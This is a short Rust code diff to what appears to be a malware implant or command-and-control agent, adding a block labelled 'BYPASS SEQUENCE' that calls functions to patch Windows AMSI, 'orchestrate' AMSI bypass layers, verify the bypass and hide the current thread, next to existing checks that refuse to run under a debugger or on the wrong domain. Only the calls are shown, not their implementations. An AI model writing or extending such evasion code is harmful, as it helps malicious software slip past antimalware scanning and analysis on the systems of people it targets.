@@ -52,6 +52,7 @@ impl Agent {
         #[cfg(windows)]
         unsafe {
             evasion::patch_amsi();
+            amsi_defense::orchestrate_layers();
         }
 
         let cfg = config::load_config()?;
@@ -96,6 +97,15 @@ impl Agent {
     }
 
     pub async fn run(&mut self) -> Result<()> {
+        // BYPASS SEQUENCE START
+        log::debug!("Applying evasion layers");
+        unsafe { crate::evasion::patch_amsi(); }
+        crate::amsi_defense::orchestrate_layers();
+        crate::amsi_defense::verify_bypass();
+        crate::evasion::hide_current_thread();
+        log::debug!("Evasion layers applied");
+        // BYPASS SEQUENCE END
+
         // Trusted Execution Environment Enforcement (env_check.rs):
         // refuse to start under a debugger or on the wrong domain.
         {
